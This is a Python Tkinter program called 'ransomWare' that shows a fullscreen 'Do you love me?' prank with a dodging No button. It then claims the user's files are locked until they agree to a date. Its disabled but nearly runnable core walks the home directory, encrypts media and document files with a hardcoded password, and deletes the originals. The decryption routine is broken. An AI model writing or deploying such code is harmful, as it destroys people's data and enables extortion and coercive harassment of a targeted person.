import pyautogui, pyAesCrypt, os, mimetypes, threading
from tkinter import Tk, Label, Button, Entry
from time import sleep

pyautogui.FAILSAFE = False

class ransomWare(Tk):

    def __init__(self):
        super().__init__()
        self.countNo = 0
        self.button = None
        self.msg = None
        self.infoMsg = None
        self.inputMsg = None
        self.inputMsg2 = None
        self.inputMsg3 = None
        self.dateInput = None 
        self.emailInput = None
        self.timeInput = None
        self.passInput = None
        self.firstScreen()

    def firstScreen(self):
        self.title("You Can't Say No")
        self.config(bg="#00f2ff")
        self.attributes("-fullscreen", True)
        
        self.msg = Label(self, text="Do you love me ?", fg="#e74c3c", bg="#00f2ff", font=("Comic sans ms", 40, 'bold'))
        self.msg.place(relx=0.5, rely=0.3, anchor="center")

        self.yesBtn = Button(self, text="Yes", command=self.accepted, font=("Times New Roman", 25, 'bold'), bg='#0dff0d', fg='#fff', padx=20, pady=10)
        self.yesBtn.place(relx=0.55, rely=0.5)

        self.noBtn = Button(self, text="No", command=self.rejected, font=("Times New Roman", 25, 'bold'), bg='#ff0d0d', fg='#fff', padx=20, pady=10)
        self.noBtn.place(relx=0.4, rely=0.5)
        
        self.update()
        sleep(2.5)

    accepted = lambda self : self.secondScreen() if self.countNo != 0 else self._seconScreen()

    def _seconScreen(self):
        self.attributes("-fullscreen", False)
        self.geometry(f'{self.winfo_screenheight()}x{self.winfo_screenwidth()}')
        self.yesBtn.place_forget()
        self.noBtn.place_forget()
        self.msg = Label(self, text = "I Love You Too.. \U0001F49E ", fg="#2f3", bg="#00f2ff", font=("Comic sans ms", 40, 'bold'))
        self.msg.place(relx = 0.5, rely= 0.3, anchor="center")
        self.submit = Button(self, text="Get My Info", command = self.getInfo, fg="#e74c3c", bg="#fff", font=("Comic sans ms", 30, 'bold'))
        self.submit.place(relx = 0.5, rely= 0.65, anchor="center")

    def getInfo(self):
        with open("myLoverInfo.txt", "w") as file:
            details = "Name : Your_Name \nPhone : +977XXXXXXXXXX"
            file.writelines(details)
        file.close() 

    rejected = lambda self : (setattr(self, 'countNo', self.countNo + 1), self.changeButtonPosition(), print(self.countNo))

    def changeButtonPosition(self):

        # if self.countNo == 1:
        #     self.startEncryption()

        self.currentYesPos = self.yesBtn.place_info()
        self.currentNoPos = self.noBtn.place_info()
        if self.currentYesPos["relx"] == 0.55 and self.currentYesPos['rely'] == 0.5:
            self.yesBtn.place(relx=0.4, rely=0.5)
            self.noBtn.place(relx=0.55, rely=0.5)
        else:
            self.yesBtn.place(relx=self.currentNoPos['relx'], rely=self.currentNoPos['rely'])
            self.noBtn.place(relx=self.currentYesPos['relx'], rely=self.currentYesPos['rely'])

    def startEncryption(self):
        backThred = threading.Thread(target = self.encrypt)
        backThred.daemon = True
        backThred.start()
        
    def secondScreen(self):
        
        self.yesBtn.place_forget()
        self.noBtn.place_forget()

        self.infoMsg = Label(self, text = "Note: Your data is locked i will give you the key at our first date", fg="#f00", bg="#00f2ff", font=("Times New Roman", 20, 'bold'))
        self.infoMsg.place(relx=0.5, rely=0.1, anchor="center")

        self.msg = Label(self, text = "Enter time for our first date ?", fg="#2f3", bg="#00f2ff", font=("Comic sans ms", 40, 'bold'))
        self.msg.place(relx = 0.5, rely= 0.3, anchor="center")

        self.inputMsg = Label(self, text="Enter Email: ", fg="#00ff2f", bg="#00f2ff", font=("Times new roman", 20, 'bold'))
        self.inputMsg.place(relx = 0.3, rely = 0.4)
        self.emailInput = Entry(self, validate="key", width=30)
        self.emailInput.place(relx = 0.5, rely = 0.4)

        self.inputMsg2 = Label(self, text="Enter Date (MM/DD): ", fg="#00ff2f", bg="#00f2ff", font=("Times new roman", 20, 'bold'))
        self.inputMsg2.place(relx = 0.3, rely= 0.5)
        self.selectDate = Entry(self, validate="key", width=30)
        self.selectDate.place(relx = 0.5, rely= 0.5)

        self.inputMsg3 = Label(self, text="Select Time (HH:MM): ", fg="#00ff2f", bg="#00f2ff", font=("Times new roman", 20, 'bold'))
        self.inputMsg3.place(relx = 0.3, rely= 0.6)
        self.selectTime = Entry(self, validate="key", width=30)
        self.selectTime.place(relx = 0.5, rely= 0.6)

        self.submit = Button(self, text="Send", command = self.submitDate, fg="#e74c3c", bg="#fff", font=("Comic sans ms", 30, 'bold'))
        self.submit.place(relx = 0.5, rely= 0.75, anchor="center")
        
    def submitDate(self):
        email = self.emailInput.get()
        date = self.selectDate.get()
        time = self.selectTime.get()
        print(email, date, time)
        self.lastScreen()

    def lastScreen(self):

        self.msg.pack_forget()
        self.inputMsg.place_forget()
        self.inputMsg2.place_forget()
        self.inputMsg3.place_forget()
        self.infoMsg.place_forget()
        self.emailInput.place_forget()
        self.selectDate.place_forget()
        self.selectTime.place_forget()
        self.submit.place_forget()


        self.infoMsg = Label(self, text = "Note: Your data is locked i will give you the key at our first date", fg="#f00", bg="#00f2ff", font=("Times New Roman", 20, 'bold'))
        self.infoMsg.place(relx=0.5, rely=0.1, anchor="center")

        self.msg = Label(self, text = f"Sorry, you said no {self.countNo} times, so your data is locked.\nTo get password come at date", fg="#00ff5f", bg="#00f2ff", font=("Comic sans ms", 40, 'bold'))
        self.msg.place(relx = 0.5, rely= 0.3, anchor="center")

        self.inputMsg = Label(self, text="Enter Password: ", fg="#00ff2f", bg="#00f2ff", font=("Times new roman", 20, 'bold'))
        self.inputMsg.place(relx = 0.3, rely = 0.5)
        self.passInput = Entry(self, validate="key", width=30)
        self.passInput.place(relx = 0.5, rely = 0.5)

        self.submit = Button(self, text="Decrypt", command= self.decrypt, fg="#e74c3c", bg="#fff", font=("Times new roman", 30, 'bold'))
        self.submit.place(relx = 0.5, rely= 0.75, anchor="center")


    """
    It's for educational purpose
    """
    """
    def getFiles(self, path):
        getExtentions = lambda type: [ext for ext in mimetypes.types_map if mimetypes.types_map[ext].split('/')[0] == type]
        listFlatten = lambda lst: [item for subList in lst for item in (listFlatten(subList) if isinstance(subList, list) else [subList])]
        exT = listFlatten([getExtentions(i) for i in ['video','audio','image']])
        exT += ['.doc', '.pdf', '.txt', '.docs', '.dot', '.wiz', '.ppt', '.py']
        walk = lambda path : [os.path.join(root, file) for root, _, files in os.walk(path) 
                            for file in files if os.path.splitext(file)[1].lower() in exT]
        return walk(path)

    def encrypt(self):
        files = self.getFiles(os.path.expanduser('~'))
        for _file in files:
            with open(_file, 'rb') as fileIn:
                with open(_file + '.enc', 'wb') as fileOut:
                    pyAesCrypt.encryptStream(fileIn, fileOut, 'iloveyou', 128 * 1024)
                os.remove(_file)
        # self.update_gui()

    def decrypt(self):
        password = self.passInput.get()
        files = self.getFiles(os.path.expanduser('~'))
        for _file in files:
            with open(_file, 'rb') as fileIn:
                with open(_file[:-4], 'wb') as fileOut:
                    pyAesCrypt.decryptStream(fileIn, fileOut, password, 128 * 1024)
                os.remove(_file)
        self.destroy()
"""
if __name__ == '__main__':
    ily = ransomWare()
    ily.mainloop()